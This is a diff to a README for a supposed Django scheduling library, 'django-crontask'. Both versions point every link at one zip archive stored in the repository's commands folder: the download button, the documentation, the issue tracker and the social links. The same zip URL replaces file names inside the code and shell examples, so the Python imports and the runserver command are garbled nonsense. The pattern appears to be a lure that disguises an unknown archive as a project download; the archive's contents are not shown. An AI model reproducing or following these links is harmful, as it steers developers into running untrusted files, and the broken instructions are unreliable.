@@ -1,7 +1,7 @@
 # 🌟 django-crontask - Simplify Task Scheduling in Django
 
 ## 🔗 Download Now
-[![Download django-crontask](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
+[![Download django-crontask](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to django-crontask! This tool helps you schedule tasks in your Django applications easily, just like setting up a clock to perform specific tasks at routine times. Even if you have no programming background, this guide will walk you through the steps to get started.
@@ -10,7 +10,7 @@ Welcome to django-crontask! This tool helps you schedule tasks in your Django ap
 To use django-crontask, you need to download the application. 
 
 1. Click the link below to visit the releases page:
-   [Download django-crontask](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
+   [Download django-crontask](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
 
 2. On the releases page, you will find different versions of the application. Look for the latest version, which usually appears at the top of the list. 
 
@@ -32,7 +32,7 @@ Before you begin, ensure your system meets the following requirements:
 ## ⚙️ Configuration
 After you've downloaded and installed django-crontask, you will need to configure it in your Django project:
 
-1. Open your Django project's settings file (`https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip`).
+1. Open your Django project's settings file (`https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip`).
    
 2. Add `crontask` to your `INSTALLED_APPS` list. It should look like this:
    ```python
@@ -46,7 +46,7 @@ After you've downloaded and installed django-crontask, you will need to configur
 ## 📝 Creating Your First Task
 Now, let’s create a simple scheduled task. Follow these steps:
 
-1. In your Django application directory, create a new Python file called `https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip`.
+1. In your Django application directory, create a new Python file called `https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip`.
    
 2. Add the following code to define a task:
    ```python
@@ -62,7 +62,7 @@ Now, let’s create a simple scheduled task. Follow these steps:
 
 4. You need to run your Django application to see your task in action. Use the command:
    ```shell
-   python https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip runserver
+   python https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip runserver
    ```
 
 5. Verify that your task runs as expected by checking the console output.
@@ -80,12 +80,12 @@ You can adjust these settings in your task definition.
 ## 🔍 Monitoring Tasks
 With django-crontask, you can easily monitor scheduled tasks. Use Django’s admin panel to view the status of your tasks:
 
-1. Add the `crontask` app to your admin interface by including it in your `https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip`:
+1. Add the `crontask` app to your admin interface by including it in your `https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip`:
    ```python
-   from https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip import admin
-   from https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip import Crontask
+   from https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip import admin
+   from https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip import Crontask
 
-   https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip(Crontask)
+   https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip(Crontask)
    ```
 
 2. Navigate to your Django admin panel at `http://127.0.0.1:8000/admin`.
@@ -98,18 +98,18 @@ If you encounter any issues while using django-crontask, consider the following 
 - Ensure that your Python and Django versions are compatible.
 - Check the syntax of your cron expressions. A simple mistake can prevent tasks from running.
 - Look at the console output for any error messages that can guide you in troubleshooting.
-- Make sure your database settings are correct in `https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip`.
+- Make sure your database settings are correct in `https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip`.
 
 ## 📚 Additional Resources
-- [Django Documentation](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
-- [Cron Syntax Explained](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
-- [GitHub Issues](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip) - For support and feedback
+- [Django Documentation](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
+- [Cron Syntax Explained](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip) - For support and feedback
 
 ## 🌐 Community & Support
 Join our community to ask questions or share your experiences. You can find us on:
 - GitHub Discussions
-- Twitter: [@yourhandle](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
+- Twitter: [@yourhandle](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
 
 Ready to start automatic task scheduling? Download now and simplify your Django tasks today!
 
-[Download django-crontask](https://github.com/mobdudeedits/django-crontask/raw/refs/heads/main/crontask/management/commands/django-crontask-v3.8.zip)
+[Download django-crontask](https://raw.githubusercontent.com/mobdudeedits/django-crontask/main/crontask/management/commands/django-crontask-2.6-alpha.3.zip)
